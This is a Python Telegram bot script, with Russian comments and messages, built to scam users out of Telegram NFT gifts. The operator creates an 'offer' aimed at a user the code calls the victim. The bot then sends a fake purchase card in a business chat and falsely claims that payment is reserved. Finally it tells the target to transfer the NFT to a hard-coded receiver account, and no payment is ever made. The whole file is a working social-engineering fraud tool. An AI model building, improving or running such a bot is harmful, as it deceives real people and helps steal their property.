import os
import re
import uuid
import asyncio
import logging
import sys
from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.types import (Message, CallbackQuery, InlineKeyboardButton,
                           InlineKeyboardMarkup, BusinessConnection)
from dotenv import load_dotenv

# ВАЖНО: app.py больше не импортируем!
# Все данные храним в оперативной памяти (словарь OFFERS)
load_dotenv()
logging.basicConfig(level=logging.INFO, stream=sys.stdout)
log = logging.getLogger("offerbot")

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
RECEIVER = os.getenv("RECEIVER_USERNAME", "vo1d_root")

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
dp.include_router(router)

# Хранилище офферов в памяти (вместо базы данных)
OFFERS = {}

NFT_RE = re.compile(r"https?://t\.me/nft/([A-Za-z0-9_-]+)", re.I)
PRICE_RE = re.compile(r"(\d+)\s*(gram|грам|звезд|star|stars|⭐|grams)", re.I)
CODE_RE = re.compile(r"(of_[a-f0-9]{5})", re.I)

def parse_nft(url: str):
    m = NFT_RE.search(url)
    if not m: return None
    slug_raw = m.group(1)
    parts = slug_raw.rsplit("-", 1)
    name_raw, num = (parts[0], parts[1]) if len(parts) == 2 and parts[1].isdigit() else (slug_raw, "")
    display = re.sub(r"(?<!^)(?=[A-Z])", " ", name_raw).strip()
    return {"slug": slug_raw, "name": f"{display} #{num}" if num else display}

def parse_price(text: str):
    m = PRICE_RE.search(text)
    if not m: return None
    amount, unit = m.group(1), m.group(2).lower()
    return f"{amount} Gram" if unit in ("gram", "грам", "grams") else f"{amount} Stars"

# ==========================================
# ЛИЧКА БОТА (Генерация оффера)
# ==========================================
@router.message(Command("start"))
async def cmd_start(msg: Message):
    if msg.from_user.id != ADMIN_ID: return
    await msg.reply(
        "🤖 <b>Бот готов!</b>\n\n"
        "Формат: <code>/купить [ссылка] [цена] [@username]</code>\n"
        "Пример: <code>/купить https://t.me/nft/MirageLamp-73768 155 GRAM @target</code>"
    )

@router.message(F.text.regexp(r"^/купить\s+"))
async def cmd_buy(msg: Message):
    if msg.from_user.id != ADMIN_ID: return

    parts = msg.text.replace("/купить", "").strip().split()
    if len(parts) < 3:
        await msg.reply("❌ Формат: <code>/купить [ссылка] [цена] [@username]</code>")
        return

    url = parts[0]
    target_user = parts[-1] if parts[-1].startswith("@") else "unknown"
    price_text = " ".join(parts[1:-1]) if target_user != "unknown" else " ".join(parts[1:])

    nft = parse_nft(url)
    price = parse_price(price_text)

    if not nft or not price:
        await msg.reply("❌ Не понял ссылку или цену.")
        return

    oid = "of_" + uuid.uuid4().hex[:5]
    
    # Сохраняем в память
    OFFERS[oid] = {
        "nft_name": nft["name"],
        "nft_slug": nft["slug"],
        "price": price,
        "buyer": msg.from_user.username or "buyer",
        "target_user": target_user
    }

    await msg.reply(
        f"✅ <b>Оффер создан!</b>\n\n"
        f"Подарок: {nft['name']}\n"
        f"Цена: {price}\n"
        f"Жертва: {target_user}\n\n"
        f"Код: <code>{oid}</code>\n"
        f"Отправь его в чат с жертвой."
    )

# ==========================================
# BUSINESS-ЧАТ (Отправка карточки и логика)
# ==========================================
@router.business_message(F.text)
async def handle_business_message(msg: Message):
    if msg.from_user and msg.from_user.id != ADMIN_ID: return

    m = CODE_RE.search(msg.text)
    if not m: return

    oid = m.group(1).lower()
    offer = OFFERS.get(oid)
    if not offer: return

    conn_id = msg.business_connection_id
    if not conn_id: return

    target_user = msg.from_user.username or "buyer"
    card_text = (
        f"Пользователь <b>{target_user}</b> предлагает Вам <b>{offer['price']}</b> "
        f"за подарок <b>{offer['nft_name']}</b>.\n\n"
        f"Предложение действует ещё <b>6ч 0м</b>.\n\n"
        f"https://t.me/nft/{offer['nft_slug']}"
    )

    # Кнопка "Принять" теперь вызывает callback, а не открывает сайт!
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отклонить", callback_data=f"reject:{oid}"),
         InlineKeyboardButton(text="Принять", callback_data=f"accept1:{oid}")]
    ])
    
    try:
        await bot.send_message(
            chat_id=msg.chat.id, text=card_text, business_connection_id=conn_id,
            reply_markup=kb, disable_web_page_preview=False
        )
        await asyncio.sleep(0.5)
        try: await bot.delete_message(chat_id=msg.chat.id, message_id=msg.message_id)
        except: pass
    except Exception as e:
        log.error(f"❌ Ошибка: {e}")

# ==========================================
# ЛОГИКА КНОПОК (Инструкция и Передача)
# ==========================================

# 1. Нажатие на первую "Принять"
@router.callback_query(F.data.startswith("accept1:"))
async def on_accept1(cb: CallbackQuery):
    oid = cb.data.split(":", 1)[1]
    
    # Меняем сообщение на инструкцию
    text = (
        f"<b>Сумма {OFFERS[oid]['price']} зарезервирована.</b>\n\n"
        f"Чтобы завершить сделку:\n"
        f"1. Ознакомьтесь с инструкцией ниже.\n"
        f"2. Нажмите «Передать NFT»."
    )
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Принять и Передать", callback_data=f"accept2:{oid}")]
    ])
    
    await cb.message.edit_text(text=text, reply_markup=kb)
    await cb.answer()

# 2. Нажатие на "Принять и Передать"
@router.callback_query(F.data.startswith("accept2:"))
async def on_accept2(cb: CallbackQuery):
    oid = cb.data.split(":", 1)[1]
    offer = OFFERS.get(oid)
    
    # ОТПРАВЛЯЕМ ССЫЛКУ НА ПЕРЕДАЧУ НАТИВНОГО ПОДАРКА
    # Именно ссылка t.me/nft/slug заставляет Telegram открыть НАТИВНОЕ меню!
    native_url = f"https://t.me/nft/{offer['nft_slug']}"
    
    text = (
        f"<b>Инструкция по передаче:</b>\n\n"
        f"1. Нажмите на подарок выше\n"
        f"2. Выберите «Передать NFT»\n"
        f"3. Укажите получателя: <b>@{RECEIVER}</b>\n"
        f"4. Подтвердите.\n\n"
        f"👇 Или перейдите по ссылке ниже:"
    )
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Передать NFT ↗", url=native_url)]
    ])
    
    await cb.message.edit_text(text=text, reply_markup=kb)
    await cb.answer()

@router.callback_query(F.data.startswith("reject:"))
async def on_reject(cb: CallbackQuery):
    try: await cb.message.edit_reply_markup(reply_markup=None)
    except: pass
    await cb.answer("Вы отклонили предложение.")

@router.business_connection()
async def on_business_conn(conn: BusinessConnection):
    log.info(f"✅ Business connection: user={conn.user.id} id={conn.id}")

async def main():
    log.info("Starting bot...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
